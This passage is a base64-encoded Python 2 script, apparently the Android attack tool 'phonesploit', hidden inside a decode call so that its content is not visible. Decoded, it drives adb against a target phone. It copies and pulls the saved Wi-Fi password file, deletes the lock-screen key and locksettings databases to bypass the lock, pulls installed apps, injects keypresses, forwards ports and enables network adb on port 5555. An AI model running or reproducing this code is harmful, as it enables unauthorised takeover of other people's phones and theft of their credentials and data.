FtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHBvcnRfZm9yd2FyZCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XUVudGVyIGEgcG9ydCBvbiB0aGUgZGV2aWNlLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgcG9ydF9kZXZpY2UgPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIocG9ydF9mb3J3YXJkKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIHByaW50ICgoIiAgICAgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKCgiICAgICAgICBbezB9K3sxfV1FbnRlciBhIHBvcnQgdG8gZm9yd2FyZCBpdCB0b28uIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBmb3J3YXJkX3BvcnQgPSByYXdfaW5wdXQoIiAgICAgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHBvcnRfZm9yd2FyZCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgZm9yd2FyZCB0Y3A6Iitwb3J0X2RldmljZSsiIHRjcDoiK2ZvcndhcmRfcG9ydCkgCgogICAgZWxpZiBvcHRpb24gPT0gJzE3JzoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHByaW50ICgoIlt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIih3cGFfZ3JhYikgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgcHJpbnQgKChGb3JlLldISVRFICsgIiAgICBbezB9K3sxfV17MX1USEUgREVWSUNFIE5FRURTIFRPIEJFIFJPT1RFRCBUTyBDT05USU5VRSBUTyBFWElUIFVTRSBDVFJMICtDIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgd2hlcmUgeW91IHdhbnQgdGhlIGZpbGUgdG8gYmUgc2F2ZWQuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgbG9jYXRpb24gPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIod3BhX2dyYWIpICIrRm9yZS5XSElURSArICI+ICIpICAgICAgCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCAiKyJzdSAtYyAnY3AgL2RhdGEvbWlzYy93aWZpL3dwYV9zdXBwbGljYW50LmNvbmYgL3NkY2FyZC8nIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHB1bGwgL3NkY2FyZC93cGFfc3VwcGxpY2FudC5jb25mICIrbG9jYXRpb24pCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgICAgICBtYWluKCkgICAgCgogICAgZWxpZiBvcHRpb24gPT0gJzE4JzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1hY19pbmV0KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIgK2RldmljZV9uYW1lKyAiIHNoZWxsIGlwIGFkZHJlc3Mgc2hvdyB3bGFuMCIpCiAgICAgICAgbWFpbigpCgogICAgZWxpZiBvcHRpb24gPT0gJzE5JzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHB1bGxfYXBrKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgYSBwYWNrYWdlIG5hbWUuIFRoZXkgbG9vayBsaWtlIHRoaXMgLS0+IGNvbS5zbmFwY2hhdC5hbmRyb2lkIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBwYWNrYWdlX25hbWUgPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIocHVsbF9hcGspICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHBtIHBhdGggIitwYWNrYWdlX25hbWUpCiAgICAgICAgcHJpbnQgKCgiICAgICAgICAgIitjb25uZWN0KSkKICAgICAgICBwcmludCAoKCIgICAgICAgIFt7MH0rezF9XUVudGVyIFRoZSBwYXRoLmxvb2tzIGxpa2UgdGhpcyAvZGF0YS9hcHAvY29tLnNuYXBjaGF0LmFuZHJvaWQtcVdnRGNCaUNFdkFOcTZvcF9OUHFlQT09L2Jhc2UuYXBrIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBwYXRoID0gcmF3X2lucHV0KCIgICAgICAgICIrYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihwdWxsX2FwaykgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoKCIgICAgICAgICAgICAgIitjb25uZWN0KSkKICAgICAgICBwcmludCAoKCIgICAgICAgICAgICBbezB9K3sxfV1FbnRlciBUaGUgbG9jYXRpb24gdG8gc3RvcmUgdGhlIGFwazogIikgIC5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGxvY2F0aW9uID0gICByYXdfaW5wdXQoIiAgICAgICAgICAgICIrYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihwdWxsX2FwaykgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsiIHB1bGwgIitwYXRoKyIgIitsb2NhdGlvbikKICAgICAgICBtYWluKCkKCiAgICBlbGlmIG9wdGlvbiA9PSAnMjAnOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoYmF0dGVyeSkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBzaGVsbCBkdW1wc3lzIGJhdHRlcnkiKQogICAgICAgIG1haW4oKQoKICAgIGVsaWYgb3B0aW9uID09ICcyMSc6CiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihuZXRfc3RhdCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBzaGVsbCBuZXRzdGF0IikKICAgICAgICBtYWluKCkKCiAgICBlbGlmIG9wdGlvbiA9PSAnMjInOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIod2lmaSkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XSBUbyB0dXJuIHdpZmkgYmFjayBvbiB5b3UgbmVlZCB0aGUgZGV2aWNlIHRvIGJlIHBsdWdlZCBpbi4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICBvbl9vZmYgPSByYXdfaW5wdXQoRm9yZS5XSElURSArICIgICAgWyIrRm9yZS5SRUQrIisiK0ZvcmUuV0hJVEUrIl1Xb3VsZCB5b3UgbGlrZSB0aGUgd2lmaSAiK0ZvcmUuR1JFRU4gKyJvbiIrRm9yZS5XSElURSArIi8iK0ZvcmUuUkVEICsib2ZmICIrRm9yZS5XSElURSkKICAgICAgICBpZiBvbl9vZmYgPT0gJ29mZic6CiAgICAgICAgICAgIGNvbW1hbmQgPSAiIHNoZWxsIHN2YyB3aWZpIGRpc2FibGUiCiAgICAgICAgZWxzZToKICAgICAgICAgICAgY29tbWFuZCA9ICIgc2hlbGwgc3ZjIHdpZmkgZW5hYmxlIgogICAgICAgICAgICAKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lK2NvbW1hbmQpCgogICAgZWxpZiBvcHRpb24gPT0gJzIzJzoKICAgICAgICBwcmludCAoKCJbezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihwYXNzX3JlbW92ZSkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoKEZvcmUuV0hJVEUgKyAiICAgIFt7MH0rezF9XXsxfVRIRSBERVZJQ0UgTkVFRFMgVE8gQkUgUk9PVEVEIFRPIENPTlRJTlVFIFRPIEVYSVQgVVNFIENUUkwgK0MgVEhJUyBJUyBBTFNPIFVOVEVTVEVEIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKEZvcmUuUkVEICsgIioqKioqKioqKioqKioqKioqKlRSWUlORyBUTyBSRU1PVkUgUEFTUyoqKioqKioqKioqKioqKioqKiIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHN1IDAgJ3JtIC9kYXRhL3N5c3RlbS9nZXN0dXJlLmtleSciKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzdSAwICdybSAvZGF0YS9zeXN0ZW0vbG9ja3NldHRpbmdzLmRiJyIpIAogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzdSAwICdybSAvZGF0YS9zeXN0ZW0vbG9ja3NldHRpbmdzLmRiLXdhbCciKSAKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgc3UgMCAncm0gL2RhdGEvc3lzdGVtL2xvY2tzZXR0aW5ncy5kYi1zaG0nIikKICAgICAgICBwcmludCAoRm9yZS5SRUQgKyAiKioqKioqKioqKioqKioqKioqVFJZSU5HIFRPIFJFTU9WRSBQQVNTKioqKioqKioqKioqKioqKioqIikgIAogICAgICAgIAogICAgZWxpZiBvcHRpb24gPT0gJzI0JzoKICAgICAgICBwcmludCAoKCJbezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihrZXljb2RlKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIHByaW50ICgnJycKMCAtLT4gICJLRVlDT0RFX1VOS05PV04iIAoxIC0tPiAgIktFWUNPREVfTUVOVSIgCjIgLS0+ICAiS0VZQ09ERV9TT0ZUX1JJR0hUIiAKMyAtLT4gICJLRVlDT0RFX0hPTUUiIAo0IC0tPiAgIktFWUNPREVfQkFDSyIgCjUgLS0+ICAiS0VZQ09ERV9DQUxMIiAKNiAtLT4gICJLRVlDT0RFX0VORENBTEwiIAo3IC0tPiAgIktFWUNPREVfMCIgCjggLS0+ICAiS0VZQ09ERV8xIiAKOSAtLT4gICJLRVlDT0RFXzIiIAoxMCAtLT4gICJLRVlDT0RFXzMiIAoxMSAtLT4gICJLRVlDT0RFXzQiIAoxMiAtLT4gICJLRVlDT0RFXzUiIAoxMyAtLT4gICJLRVlDT0RFXzYiIAoxNCAtLT4gICJLRVlDT0RFXzciIAoxNSAtLT4gICJLRVlDT0RFXzgiIAoxNiAtLT4gICJLRVlDT0RFXzkiIAoxNyAtLT4gICJLRVlDT0RFX1NUQVIiIAoxOCAtLT4gICJLRVlDT0RFX1BPVU5EIiAKMTkgLS0+ICAiS0VZQ09ERV9EUEFEX1VQIiAKMjAgLS0+ICAiS0VZQ09ERV9EUEFEX0RPV04iIAoyMSAtLT4gICJLRVlDT0RFX0RQQURfTEVGVCIgCjIyIC0tPiAgIktFWUNPREVfRFBBRF9SSUdIVCIgCjIzIC0tPiAgIktFWUNPREVfRFBBRF9DRU5URVIiIAoyNCAtLT4gICJLRVlDT0RFX1ZPTFVNRV9VUCIgCjI1IC0tPiAgIktFWUNPREVfVk9MVU1FX0RPV04iIAoyNiAtLT4gICJLRVlDT0RFX1BPV0VSIiAKMjcgLS0+ICAiS0VZQ09ERV9DQU1FUkEiIAoyOCAtLT4gICJLRVlDT0RFX0NMRUFSIiAKMjkgLS0+ICAiS0VZQ09ERV9BIiAKMzAgLS0+ICAiS0VZQ09ERV9CIiAKMzEgLS0+ICAiS0VZQ09ERV9DIiAKMzIgLS0+ICAiS0VZQ09ERV9EIiAKMzMgLS0+ICAiS0VZQ09ERV9FIiAKMzQgLS0+ICAiS0VZQ09ERV9GIiAKMzUgLS0+ICAiS0VZQ09ERV9HIiAKMzYgLS0+ICAiS0VZQ09ERV9IIiAKMzcgLS0+ICAiS0VZQ09ERV9JIiAKMzggLS0+ICAiS0VZQ09ERV9KIiAKMzkgLS0+ICAiS0VZQ09ERV9LIiAKNDAgLS0+ICAiS0VZQ09ERV9MIiAKNDEgLS0+ICAiS0VZQ09ERV9NIiAKNDIgLS0+ICAiS0VZQ09ERV9OIiAKNDMgLS0+ICAiS0VZQ09ERV9PIiAKNDQgLS0+ICAiS0VZQ09ERV9QIiAKNDUgLS0+ICAiS0VZQ09ERV9RIiAKNDYgLS0+ICAiS0VZQ09ERV9SIiAKNDcgLS0+ICAiS0VZQ09ERV9TIiAKNDggLS0+ICAiS0VZQ09ERV9UIiAKNDkgLS0+ICAiS0VZQ09ERV9VIiAKNTAgLS0+ICAiS0VZQ09ERV9WIiAKNTEgLS0+ICAiS0VZQ09ERV9XIiAKNTIgLS0+ICAiS0VZQ09ERV9YIiAKNTMgLS0+ICAiS0VZQ09ERV9ZIiAKNTQgLS0+ICAiS0VZQ09ERV9aIiAKNTUgLS0+ICAiS0VZQ09ERV9DT01NQSIgCjU2IC0tPiAgIktFWUNPREVfUEVSSU9EIiAKNTcgLS0+ICAiS0VZQ09ERV9BTFRfTEVGVCIgCjU4IC0tPiAgIktFWUNPREVfQUxUX1JJR0hUIiAKNTkgLS0+ICAiS0VZQ09ERV9TSElGVF9MRUZUIiAKNjAgLS0+ICAiS0VZQ09ERV9TSElGVF9SSUdIVCIgCjYxIC0tPiAgIktFWUNPREVfVEFCIiAKNjIgLS0+ICAiS0VZQ09ERV9TUEFDRSIgCjYzIC0tPiAgIktFWUNPREVfU1lNIiAKNjQgLS0+ICAiS0VZQ09ERV9FWFBMT1JFUiIgCjY1IC0tPiAgIktFWUNPREVfRU5WRUxPUEUiIAo2NiAtLT4gICJLRVlDT0RFX0VOVEVSIiAKNjcgLS0+ICAiS0VZQ09ERV9ERUwiIAo2OCAtLT4gICJLRVlDT0RFX0dSQVZFIiAKNjkgLS0+ICAiS0VZQ09ERV9NSU5VUyIgCjcwIC0tPiAgIktFWUNPREVfRVFVQUxTIiAKNzEgLS0+ICAiS0VZQ09ERV9MRUZUX0JSQUNLRVQiIAo3MiAtLT4gICJLRVlDT0RFX1JJR0hUX0JSQUNLRVQiIAo3MyAtLT4gICJLRVlDT0RFX0JBQ0tTTEFTSCIgCjc0IC0tPiAgIktFWUNPREVfU0VNSUNPTE9OIiAKNzUgLS0+ICAiS0VZQ09ERV9BUE9TVFJPUEhFIiAKNzYgLS0+ICAiS0VZQ09ERV9TTEFTSCIgCjc3IC0tPiAgIktFWUNPREVfQVQiIAo3OCAtLT4gICJLRVlDT0RFX05VTSIgCjc5IC0tPiAgIktFWUNPREVfSEVBRFNFVEhPT0siIAo4MCAtLT4gICJLRVlDT0RFX0ZPQ1VTIiAKODEgLS0+ICAiS0VZQ09ERV9QTFVTIiAKODIgLS0+ICAiS0VZQ09ERV9NRU5VIiAKODMgLS0+ICAiS0VZQ09ERV9OT1RJRklDQVRJT04iIAo4NCAtLT4gICJLRVlDT0RFX1NFQVJDSCIgCjg1IC0tPiAgIlRBR19MQVNUX0tFWUNPREUiICAgICAgICAKICAgICAgICAnJycpICAgICAgICAKICAgICAgICBwcmludCAoKCJbezB9K3sxfV1FbnRlciBhIG51bWJlci4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIG51bSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKGtleWNvZGUpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIGlucHV0IGtleWV2ZW50ICIrbnVtKQoKICAgIGVsaWYgb3B0aW9uID09ICcyNSc6CiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihjdXJyZW50X2FjdGl2aXR5KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIgK2RldmljZV9uYW1lKyAiIGR1bXBzeXMgYWN0aXZpdHkiKQogICAgICAgIG1haW4oKQogICAgICAgIAogICAgZWxpZiBvcHRpb24gPT0gJzAnOgogICAgICAgIGdsb2JhbCBwYWdlMgogICAgICAgIGlmIHBhZ2UyID09IFRydWU6CiAgICAgICAgICAgIGNsZWFyKHBhZ2VfMikKICAgICAgICBlbHNlOgogICAgICAgICAgICBjbGVhcihwYWdlXzEpCgogICAgZWxpZiBvcHRpb24gPT0gJ3AnOgogICAgICAgIG9zLnN5c3RlbSgnY2xzJykKICAgICAgICBwYWdlMiA9IFRydWUKICAgICAgICBiYW5uZXJfdGl0bGUgPSByYW5kb20uY2hvaWNlKFtsb2dvX2Rlc2lnbl8xLGxvZ29fZGVzaWduXzIsbG9nb19kZXNpZ25fMyxsb2dvX2Rlc2lnbl80XSkKICAgICAgICBwcmludCAoRm9yZS5SRUQgKyBiYW5uZXJfdGl0bGUpCiAgICAgICAgcHJpbnQgKHBhZ2VfMikgIAoKICAgIGVsaWYgb3B0aW9uID09ICdiJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICAgICAgcGFnZTIgPSBGYWxzZQogICAgICAgIGJhbm5lcl90aXRsZSA9IHJhbmRvbS5jaG9pY2UoW2xvZ29fZGVzaWduXzEsbG9nb19kZXNpZ25fMixsb2dvX2Rlc2lnbl8zLGxvZ29fZGVzaWduXzRdKQogICAgICAgIHByaW50IChGb3JlLlJFRCArIGJhbm5lcl90aXRsZSkKICAgICAgICBwcmludCAocGFnZV8xKSAgCgogICAgZWxpZiBvcHRpb24gPT0gJzk5JzoKICAgICAgICBleGl0KCkKCgogICAgbWFpbigpCgojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KCmRlZiBjbGVhcihwYWdlKToKICAgIGdsb2JhbCBwYWdlMgogICAgb3Muc3lzdGVtKCdjbHMnKQogICAgYmFubmVyX3RpdGxlID0gcmFuZG9tLmNob2ljZShbbG9nb19kZXNpZ25fMSxsb2dvX2Rlc2lnbl8yLGxvZ29fZGVzaWduXzMsbG9nb19kZXNpZ25fNCxsb2dvX2Rlc2lnbl81LGxvZ29fZGVzaWduXzYsbG9nb19kZXNpZ25fN10pCiAgICBwcmludCAoRm9yZS5SRUQgKyBiYW5uZXJfdGl0bGUpICAgIAogICAgcHJpbnQgKHBhZ2UpCgoKCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PSAgCiMgUnVuCnRyeToKICAgIGluaXQoY29udmVydD1UcnVlKQogICAgb3MuY2hkaXIoQ3VycmVudERpcisiLy9hZGIiKQogICAgcHJpbnQgKEZvcmUuUkVEICsgIlN0YXJ0aW5nICBhZGIgc2VydmVyLi4iKQogICAgb3Muc3lzdGVtKCJhZGIgdGNwaXAgNTU1NSIpCiAgICB0LnNsZWVwKDQpCiAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICBiYW5uZXJfdGl0bGUgPSByYW5kb20uY2hvaWNlKFtsb2dvX2Rlc2lnbl8xLGxvZ29fZGVzaWduXzIsbG9nb19kZXNpZ25fMyxsb2dvX2Rlc2lnbl80LGxvZ29fZGVzaWduXzUsbG9nb19kZXNpZ25fNixsb2dvX2Rlc2lnbl83XSkKICAgIHByaW50IChGb3JlLlJFRCArIGJhbm5lcl90aXRsZSkgIAogICAgcHJpbnQgKHBhZ2VfMSkKICAgIG1haW4oKQpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICBtYWluKCkKCgoKCgoKCgoKCgoKCgoKCgo="))
